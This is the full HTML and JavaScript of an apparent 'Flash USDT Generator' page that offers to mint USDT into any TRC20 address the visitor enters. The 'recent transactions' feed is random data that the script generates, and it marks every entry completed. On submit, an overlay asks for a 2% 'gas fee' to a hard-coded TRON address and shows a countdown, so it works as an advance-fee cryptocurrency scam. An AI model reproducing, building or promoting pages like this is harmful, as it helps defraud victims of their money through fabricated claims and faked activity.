<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Flash USDT Generator</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');

  * {
    box-sizing: border-box;
  }
  body {
    margin: 0;
    background: #000000;
    color: #00ff00;
    font-family: 'VT323', monospace;
    overflow-x: hidden;
    height: 100vh;
  }

  .terminal-container {
    max-width: 900px;
    margin: 0 auto;
    padding: 24px 16px;
    position: relative;
    z-index: 10;
  }

  h1, h2 {
    margin: 0 0 20px 0;
    text-align: center;
    letter-spacing: 0.2em;
    text-shadow:
      0 0 8px #00ff00,
      0 0 10px #00ff00,
      0 0 20px #00ff00;
  }

  #matrix-rain {
    position: fixed;
    top: 0; left: 0;
    width: 100vw;
    height: 100vh;
    pointer-events: none;
    z-index: 1;
  }
  .matrix-char {
    position: absolute;
    font-size: 1.2em;
    color: #0f0;
    opacity: 0.2;
    animation: matrix-fall linear infinite;
    user-select: none;
  }
  @keyframes matrix-fall {
    0% { transform: translateY(-150%); opacity: 0; }
    10% { opacity: 1; }
    90% { opacity: 1; }
    100% { transform: translateY(105vh); opacity: 0; }
  }

  .glitch-text {
    position: relative;
    color: #00ff00;
    animation: flicker 1.6s infinite;
  }
  @keyframes flicker {
    0%, 18%, 22%, 25%, 53%, 57%, 100% { opacity: 1; }
    20%, 24%, 55% { opacity: 0.4; }
  }
  .glitch-overlay {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background:
      repeating-linear-gradient(
        45deg,
        transparent,
        transparent 2px,
        rgba(0,255,0,0.05) 2px,
        rgba(0,255,0,0.05) 4px
      ),
      repeating-linear-gradient(
        -45deg,
        transparent,
        transparent 2px,
        rgba(0,255,0,0.05) 2px,
        rgba(0,255,0,0.05) 4px
      );
    pointer-events: none;
    animation: glitch-move 6s linear infinite;
    z-index: 9;
  }
  @keyframes glitch-move {
    0% { background-position: 0 0, 0 0; }
    25% { background-position: 40px 40px, -40px -40px; }
    50% { background-position: 80px 80px, -80px -80px; }
    75% { background-position: 40px 40px, -40px -40px; }
    100% { background-position: 0 0, 0 0; }
  }

  form {
    background: rgba(0, 20, 0, 0.85);
    padding: 22px 26px;
    border: 1px solid #0f0;
    border-radius: 8px;
    max-width: 460px;
    margin: 0 auto 40px auto;
  }
  label {
    display: block;
    margin-bottom: 7px;
    font-size: 1.3em;
    text-shadow:
      0 0 6px #00ff00,
      0 0 10px #00ff00;
  }
  input[type=text], input[type=number] {
    width: 100%;
    padding: 14px 13px;
    margin-bottom: 22px;
    background: black;
    border: 2px solid #0f0;
    border-radius: 6px;
    color: #00ff00;
    font-family: 'VT323', monospace;
    font-size: 1.2em;
    letter-spacing: 0.1em;
    text-shadow:
      0 0 5px #00ff00;
    outline: none;
  }
  input[type=text]:focus, input[type=number]:focus {
    border-color: #aaffaa;
    box-shadow: 0 0 14px #0f0;
  }
  button {
    width: 100%;
    padding: 18px;
    font-size: 1.38em;
    font-weight: bold;
    color: #000;
    background-color: #00ff00;
    border-radius: 10px;
    border: none;
    cursor: pointer;
    letter-spacing: 0.12em;
    text-shadow: none;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #22ff22;
  }

  #transaction-list {
    max-width: 460px;
    margin: 0 auto 40px auto;
  }
  .transaction-block {
    background: rgba(0, 30, 0, 0.75);
    border: 1.5px solid #00ff00;
    border-radius: 6px;
    padding: 12px 18px;
    margin-bottom: 14px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 1.15em;
    text-shadow:
      0 0 6px #00ff00;
  }
  .transaction-id {
    font-family: monospace;
    font-weight: bold;
  }
  .transaction-amount {
    color: #ffff55;
    font-weight: 700;
  }
  .transaction-status {
    background: #003300;
    padding: 6px 16px;
    border-radius: 20px;
    font-weight: bold;
    color: #00ff00;
    border: 1px solid #00ff00;
    font-size: 0.95em;
    text-shadow: 0 0 7px #00ff00;
  }
  .timestamp {
    margin-left: 10px;
    font-size: 0.9em;
    color: #0c0;
  }

  .transactions-paging {
    display: flex;
    justify-content: center;
    gap: 12px;
    margin-bottom: 42px;
  }
  .transactions-paging button {
    background: transparent;
    border: 1.5px solid #00ff00;
    color: #00ff00;
    font-family: 'VT323', monospace;
    font-weight: bold;
    padding: 8px 20px;
    font-size: 1.3em;
    cursor: pointer;
    border-radius: 6px;
    transition: background-color 0.3s ease;
    text-shadow: 0 0 6px #00ff00;
  }
  .transactions-paging button.active {
    background: #00ff00;
    color: #000;
    text-shadow: none;
    border-color: #00dd00;
  }

  .overlay {
    position: fixed; inset: 0; background: rgba(0,0,0,0.98);
    color: #00ff00; font-family: 'VT323', monospace;
    display: none; justify-content: center; align-items: center;
    flex-direction: column; gap: 18px; text-align: center; letter-spacing: 0.15em;
    z-index: 999999; padding: 20px;
  }
  .overlay h2 {
    font-size: 2.2em;
    text-shadow:
      0 0 10px #00ff00,
      0 0 25px #00ff00,
      0 0 35px #00ff00;
  }
  .overlay .loading-spinner {
    border: 6px solid #000;
    border-top: 6px solid #00ff00;
    border-radius: 50%;
    width: 80px;
    height: 80px;
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    0% {transform: rotate(0);}
    100% {transform: rotate(360deg);}
  }
  .overlay .qr-code {
    width: 164px;
    height: 164px;
    filter: drop-shadow(0 0 5px #00ff00);
    cursor: pointer;
    border: 3px solid #00ff00;
    border-radius: 12px;
    margin: 0 auto 15px auto;
    transition: transform 0.3s ease;
  }
  .overlay .qr-code:hover {
    transform: scale(1.1);
  }
  .overlay .deposit-address {
    font-size: 1.22em;
    user-select: all;
    letter-spacing: 0.15em;
    margin-bottom: 20px;
    border: 2px solid #00ff00;
    padding: 10px 14px;
    background: rgba(0, 50, 0, 0.7);
    border-radius: 8px;
  }
  .overlay .card-summary {
    font-size: 1.1em;
    border: 1px solid #00ff00;
    border-radius: 10px;
    padding: 14px 24px;
    background: rgba(0, 20, 0, 0.8);
    width: 320px;
    margin: 0 auto 10px auto;
    box-shadow: 0 0 15px #00ff00aa;
  }
  .overlay .card-summary small {
    color: #22ff22;
    font-size: 0.85em;
    opacity: 0.7;
  }
</style>
</head>
<body>
  <div id="matrix-rain"></div>
  <div class="glitch-overlay"></div>

  <div class="terminal-container">
    <h1 class="glitch-text">FLASH USDT GENERATOR</h1>

    <form id="usdtForm" onsubmit="handleGenerate(event)">
      <label for="usdt-address" class="glitch-text">USDT TRC20 Address:</label>
      <input type="text" id="usdt-address" autocomplete="off" placeholder="Enter TRC20 address" required />

      <label for="amount-input" class="glitch-text">Amount (USDT):</label>
      <input type="number" id="amount-input" placeholder="Enter amount (min 1000)" min="1000" max="500000" />

      <button type="submit" aria-label="Generate USDT">GENERATE FLASH USDT</button>
    </form>

    <div style="text-align:center; margin-top: 10px; font-size: 1.12em; user-select:none;">
      Gas Fee: 2% only<br/>
      Gas Address: <span style="user-select:all; font-family: monospace;">Generate by API</span><br/>
      Support <a href="https://t.me/aksbro">Telegram</a> <br/>
    </div>

    <h2 class="glitch-text">RECENT TRANSACTIONS</h2>
    <div id="transaction-list"></div>
    <div class="transactions-paging" id="transactions-paging"></div>
  </div>

  <div class="overlay" id="waiting-overlay" role="alert" aria-live="assertive" aria-label="Waiting for gas fees">
    <h2>WAITING FOR GAS FEES...</h2>
    <img
      id="gas-qr"
      class="qr-code"
      src="https://api.qrserver.com/v1/create-qr-code/?size=164x164&data=TCA5FoJHueBeDr2eHZbXfrJdko7E7Mmhgc"
      alt="Gas Address QR Code"
      title="Click to copy gas address"
      onclick="copyGasAddress()"
    />
    <div class="deposit-address" id="deposit-address">TCA5FoJHueBeDr2eHZbXfrJdko7E7Mmhgc</div>
    <div class="card-summary">
      <b>Generated Amount:</b> <span id="deposit-amount">0</span> USDT<br />
      <b>Estimated Gas Fee:</b> <span id="deposit-gas">0</span> TRX<br />
      <small>Fee is 2% gas</small>
    </div>
    <div class="loading-spinner"></div>
  </div>

<script>
  const matrixContainer = document.getElementById('matrix-rain');
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-*/=%"\'#&_(),.;:?!\\|{}<>[]^~';
  for(let i=0; i < 120; i++){
    const c = document.createElement('div');
    c.className = 'matrix-char';
    c.textContent = chars.charAt(Math.floor(Math.random()* chars.length));
    c.style.left = `${Math.random() * 100}vw`;
    c.style.animationDuration = `${4 + Math.random() * 7}s`;
    c.style.animationDelay = `${Math.random() * 7}s`;
    matrixContainer.appendChild(c);
  }

  const GAS_ADDRESS = 'TCA5FoJHueBeDr2eHZbXfrJdko7E7Mmhgc';
  function copyGasAddress() {
    navigator.clipboard.writeText(GAS_ADDRESS);
    alert('Gas address copied to clipboard!');
  }

  const TX_PER_PAGE = 5;
  let allTransactions = [];
  let currentPage = 1;
  let txPageCount = 1;

  function validateAddress(address) {
    return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address.trim());
  }

  function getRelativeTime(offsetHrs) {
    const now = new Date();
    now.setHours(now.getHours() - offsetHrs);
    return now.toLocaleString('en-US',{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
  }

  function generateTransactionsList(){
    let txns = [];
    for(let i=0; i< 25; i++) {
      txns.push({
        id:`TX${Math.random().toString(36).substring(2,14).toUpperCase()}`,
        amount: Math.floor(Math.random()*499000)+1000,
        status: 'completed',
        timestamp: getRelativeTime(Math.floor(i/5))
      });
    }
    return txns;
  }

  function renderPagingControls(){
    const paging = document.getElementById('transactions-paging');
    paging.innerHTML = '';
    for(let i=1; i<=txPageCount; i++){
      const btn = document.createElement('button');
      btn.textContent = i;
      btn.className = i === currentPage ? 'active' : '';
      btn.onclick = () => { currentPage = i; populateTransactions();};
      paging.appendChild(btn);
    }
  }
  function populateTransactions(){
    const list = document.getElementById('transaction-list');
    list.innerHTML = '';
    txPageCount = Math.ceil(allTransactions.length / TX_PER_PAGE);
    const start = (currentPage -1)* TX_PER_PAGE;
    const txns = allTransactions.slice(start, start + TX_PER_PAGE);
    txns.forEach(tx => {
      const t = document.createElement('div');
      t.className = 'transaction-block';
      t.innerHTML = `
        <div class="transaction-info">
          <div class="transaction-id">${tx.id}</div>
          <div class="transaction-amount">${tx.amount.toLocaleString()} USDT</div>
        </div>
        <div>
          <div class="transaction-status">${tx.status.toUpperCase()}</div>
          <div class="timestamp">${tx.timestamp}</div>
        </div>
      `;
      list.appendChild(t);
    });
    renderPagingControls();
  }

  function refreshTransactionsPeriodically(){
    allTransactions = generateTransactionsList();
    currentPage = 1;
    populateTransactions();
  }

  const waitingOverlay = document.getElementById('waiting-overlay');

  function handleGenerate(evt){
    evt.preventDefault();
    const addrInput = document.getElementById('usdt-address');
    const amtInput = document.getElementById('amount-input');
    if (!validateAddress(addrInput.value)) {
      alert('Invalid TRC20 USDT address!');
      addrInput.focus();
      return;
    }
    const amount = parseInt(amtInput.value);
    if (!amount || amount < 1000 || amount > 500000) {
      alert('Amount must be between 1,000 and 500,000 USDT!');
      amtInput.focus();
      return;
    }
    const gasFee = Math.round((amount / 1000) * 20);

    waitingOverlay.style.display = 'flex';

    document.getElementById('deposit-amount').textContent = amount.toLocaleString();
    document.getElementById('deposit-gas').textContent = gasFee.toLocaleString();

    let countdown = 3600;
    const interval = setInterval(() => {
      countdown--;
      if (countdown <= 0) {
        clearInterval(interval);
        waitingOverlay.style.display = 'none';
      }
    }, 1000);
  }

  document.addEventListener('DOMContentLoaded', () => {
    refreshTransactionsPeriodically();
    setInterval(refreshTransactionsPeriodically, 600000);
  });
</script>
</body>
</html>
